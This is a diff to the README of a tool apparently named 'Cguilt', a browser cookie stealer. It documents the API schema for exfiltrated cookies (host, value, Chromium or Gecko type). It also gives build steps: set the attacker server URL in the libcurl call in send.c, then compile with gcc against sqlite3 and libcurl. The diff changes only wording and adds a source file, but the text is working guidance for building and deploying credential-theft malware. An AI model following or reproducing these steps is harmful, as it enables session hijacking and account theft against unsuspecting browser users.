@@ -8,8 +8,8 @@ If you want to build your own binary, scroll down. You'll also you need a server
 ## query template
 In incoming API requests query schema has three parametrs:
 1. `host`. Cookie host value. Cguilt sending cookies one-by-one, so the one request is the one cookie pair. String, max 128 chars long.
-2. `value`. Cookies content value. String, max 1024 chars long.
-3. `b_type`. Browser type. Not exactly every browsers here, but only Chromium in general (= 1) and Gecko (= 2).
+2. `value`. Cookie content value. String, max 1024 chars long.
+3. `b_type`. Browser type. Not exactly every browser here, but only Chromium in general (= 1) and Gecko (= 2).
 
 ## build
 Install `libcurl` and `sqlite3` libs. Before compilation change destination server adress in 55th string in `send.c`:
@@ -18,6 +18,6 @@ curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/api_post");
 ```
 Compile everything.
 ```bash
-$ gcc -o <name> main.c send.c `pkg-config --cflags --libs sqlite3 libcurl`
+$ gcc -o <name> main.c send.c direct.c `pkg-config --cflags --libs sqlite3 libcurl`
 ```
 
